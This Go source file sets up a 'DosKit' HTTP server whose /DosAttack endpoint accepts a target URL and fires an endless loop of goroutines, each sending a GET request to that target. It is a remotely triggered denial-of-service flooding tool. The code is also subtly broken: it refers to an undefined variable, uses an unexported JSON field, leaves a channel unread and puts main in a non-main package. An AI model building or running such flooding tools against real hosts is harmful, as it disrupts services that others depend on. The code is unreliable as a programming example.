package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

type attackRequest struct {
	target string `json:"target"`
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	decoder := json.NewDecoder(r.Body)
	var x attackRequest
	err := decoder.Decode(&x)
	if err != nil {
		panic(err)
	}
	responseChannel := make(chan interface{})
	for {
		go func() {
			response, err := http.Get(target)
			if err != nil {
				panic(err)
			}
			responseChannel <- response
		}()
	}
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusCreated)
	w.Header().Set("Content-Type", "application/html; charset=UTF-8")
	fmt.Fprintf(w, "This is DosKit Server: %s\n", r.URL.Path)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/DosAttack", attackHandler).Methods("POST")
	r.HandleFunc("/", indexHandler).Methods("GET")
	http.Handle("/", r)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
